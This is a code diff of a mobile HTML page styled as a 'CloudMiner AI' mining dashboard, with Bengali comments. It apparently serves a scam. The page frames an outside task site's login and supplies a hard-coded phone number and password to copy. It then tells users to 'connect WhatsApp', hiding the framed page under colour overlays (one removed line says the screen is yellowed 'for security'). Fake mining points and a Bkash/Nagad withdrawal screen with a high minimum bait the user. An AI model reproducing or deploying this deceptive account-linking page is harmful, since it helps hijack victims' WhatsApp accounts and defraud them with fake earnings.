@@ -3,94 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CloudMiner - Official</title>
+    <title>CloudMiner AI - Dashboard</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --wa-green: #25D366; --bg: #0b141a; }
-        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); font-family: sans-serif; overflow: hidden; color: white; }
+        :root { --primary: #25D366; --bg: #0b141a; --nav: #1f2c34; }
+        
+        * { box-sizing: border-box; }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); color: white; font-family: sans-serif; overflow: hidden; }
 
-        .view { display: none; height: 100vh; flex-direction: column; }
+        /* প্রধান কন্টেইনার */
+        .app-container { display: flex; flex-direction: column; height: 100vh; width: 100%; position: relative; }
+
+        /* ভিউ কন্ট্রোল */
+        .view { display: none; flex-direction: column; height: calc(100% - 65px); width: 100%; overflow: hidden; }
         .active-view { display: flex; }
 
-        /* হেডার ডিজাইন */
-        .fixed-header { background: #121b22; padding: 10px; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.5); position: relative; }
-        .warn { background: #ff4757; padding: 8px; border-radius: 5px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 8px; }
-        .copy-row { display: flex; gap: 8px; }
-        .copy-btn { flex: 1; background: #2c3e50; border: 1px solid #ffd700; padding: 8px; border-radius: 5px; text-align: center; font-size: 12px; cursor: pointer; color: white; }
+        /* হেডার */
+        .header { background: #121b22; padding: 10px; border-bottom: 2px solid var(--primary); z-index: 1000; }
+        .copy-row { display: flex; gap: 8px; margin-top: 5px; }
+        .c-btn { flex: 1; background: #2c3e50; border: 1px solid #ffd700; padding: 8px; border-radius: 5px; text-align: center; font-size: 11px; cursor: pointer; }
 
-        /* আইফ্রেম কন্টেইনার এবং হলুদ পর্দা */
-        .iframe-container { flex-grow: 1; position: relative; background: #fff; overflow: hidden; }
+        /* আইফ্রেম এরিয়া - যেখানে স্ক্রল লক করা হয়েছে */
+        .iframe-wrapper { flex-grow: 1; position: relative; background: #fff; overflow: hidden; width: 100%; }
         
-        /* হলুদ আয়না পর্দা - ঘনত্ব বাড়ানো হয়েছে */
-        .mirror-overlay {
+        /* স্মার্ট কালার ফিল্টার */
+        .color-filter {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 215, 0, 0.7); /* ঘন হলুদ কালার */
-            backdrop-filter: contrast(150%) brightness(90%); /* বেগুনি ভাব কাটানোর জন্য */
-            pointer-events: none; z-index: 500;
+            background: rgba(0, 255, 100, 0.1); 
+            backdrop-filter: hue-rotate(150deg) saturate(1.2); 
+            pointer-events: none; z-index: 100;
         }
 
-        /* স্ক্রল বন্ধ করার জন্য আইফ্রেম সেটিংস */
         iframe { 
             width: 100%; 
-            height: 100%; 
+            height: 100%; /* স্ক্রিনের সমান উচ্চতা */
             border: none; 
-            pointer-events: auto;
-            position: absolute;
-            top: 0;
+            overflow: hidden; 
         }
 
-        /* ফিক্সড ফুটার বাটন */
-        .fixed-footer {
-            background: #121b22; padding: 15px;
+        /* একশন বাটন এরিয়া */
+        .action-area { padding: 10px; background: #121b22; }
+        .main-btn { background: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
+
+        /* নেভিগেশন বার - একদম নিচে ফিক্সড */
+        .bottom-nav { 
+            height: 65px; 
+            background: var(--nav); 
+            display: flex; 
+            justify-content: space-around; 
+            align-items: center;
             border-top: 1px solid rgba(255,255,255,0.1);
-            z-index: 2000; box-sizing: border-box;
+            position: absolute; bottom: 0; width: 100%; z-index: 2000;
         }
-        .main-btn { background: var(--wa-green); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .nav-item { color: #8696a0; text-align: center; font-size: 11px; cursor: pointer; flex: 1; }
+        .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; }
+        .nav-item.active { color: var(--primary); }
 
         /* ড্যাশবোর্ড স্টাইল */
-        .dash-card { background: #1f2c34; padding: 40px 20px; margin: 20px; border-radius: 20px; text-align: center; border: 1px solid #ffd700; }
-        .pts-text { font-size: 45px; font-weight: bold; color: #ffd700; }
+        .card { background: #1f2c34; padding: 25px; margin: 15px; border-radius: 15px; text-align: center; border: 1px solid var(--primary); }
+        .pts { font-size: 40px; font-weight: bold; color: var(--primary); }
     </style>
 </head>
 <body>
 
-<div id="view-login" class="view active-view">
-    <div class="fixed-header">
-        <div class="warn">প্রথমে আইডি ও পাসওয়ার্ড দিয়ে লগইন করুন</div>
-        <div class="copy-row">
-            <div class="copy-btn" onclick="copyData('01321494267')">Copy ID</div>
-            <div class="copy-btn" onclick="copyData('123456789')">Copy Pass</div>
+<div class="app-container">
+    
+    <div id="view-work" class="view active-view">
+        <div class="header">
+            <div style="text-align: center; font-size: 12px; color: #ffd700;">Login & Connect WhatsApp Node</div>
+            <div class="copy-row">
+                <div class="c-btn" onclick="cpData('01321494267')">Copy ID</div>
+                <div class="c-btn" onclick="cpData('123456789')">Copy Pass</div>
+            </div>
+        </div>
+        
+        <div class="iframe-wrapper">
+            <div class="color-filter"></div>
+            <iframe src="https://www.taskm4u.com/#/login" id="appIframe" scrolling="no"></iframe>
+        </div>
+
+        <div class="action-area">
+            <button class="main-btn" id="nextBtn" onclick="processStep()">লগইন করেছি, পরবর্তী ধাপ</button>
         </div>
     </div>
-    <div class="iframe-container">
-        <div class="mirror-overlay"></div>
-        <iframe src="https://www.taskm4u.com/#/login" id="loginIframe" scrolling="no"></iframe>
-    </div>
-    <div class="fixed-footer">
-        <button class="main-btn" onclick="openHang()">লগইন করেছি, পরবর্তী ধাপ</button>
-    </div>
-</div>
 
-<div id="view-hang" class="view">
-    <div class="fixed-header">
-        <div class="warn" style="background: var(--wa-green);">এখন হোয়াটসঅ্যাপ লিঙ্ক করুন</div>
-        <p style="margin:0; font-size: 11px; text-align:center; color: #ffd700;">পর্দা হলুদ করা হয়েছে সিকিউরিটির জন্য</p>
+    <div id="view-withdraw" class="view">
+        <div class="card">
+            <p style="margin:0; color:#8696a0;">My Points</p>
+            <div class="pts" id="drawPoints">0.00 PT</div>
+        </div>
+        <div style="padding: 15px;">
+            <p>Withdraw via: Bkash/Nagad</p>
+            <button class="main-btn" style="background:#34495e;">Minimum 10,000 PT required</button>
+        </div>
     </div>
-    <div class="iframe-container">
-        <div class="mirror-overlay"></div>
-        <iframe src="about:blank" id="hangIframe" scrolling="no"></iframe>
-    </div>
-    <div class="fixed-footer">
-        <button class="main-btn" id="verifyBtn" onclick="verifyFinal()">Verify Connection</button>
-    </div>
-</div>
 
-<div id="view-final" class="view">
-    <div class="dash-card">
-        <p style="color: #8696a0;">Mining Dashboard Active</p>
-        <div class="pts-text" id="displayPts">0.00 PT</div>
-        <p style="color: var(--wa-green); font-size: 12px;">Mining Status: Online (30 PT/hr)</p>
+    <div id="view-support" class="view">
+        <div class="card">
+            <h3>Support Center</h3>
+            <p>Need help? Contact us on Telegram.</p>
+            <button class="main-btn">Join Telegram Group</button>
+        </div>
     </div>
+
+    <nav class="bottom-nav">
+        <div class="nav-item active" id="n-work" onclick="changeV('work')"><i class="fas fa-hammer"></i>Work</div>
+        <div class="nav-item" id="n-withdraw" onclick="changeV('withdraw')"><i class="fas fa-wallet"></i>Withdraw</div>
+        <div class="nav-item" id="n-support" onclick="changeV('support')"><i class="fas fa-headset"></i>Support</div>
+    </nav>
+
 </div>
 
 <script src="script.js"></script>
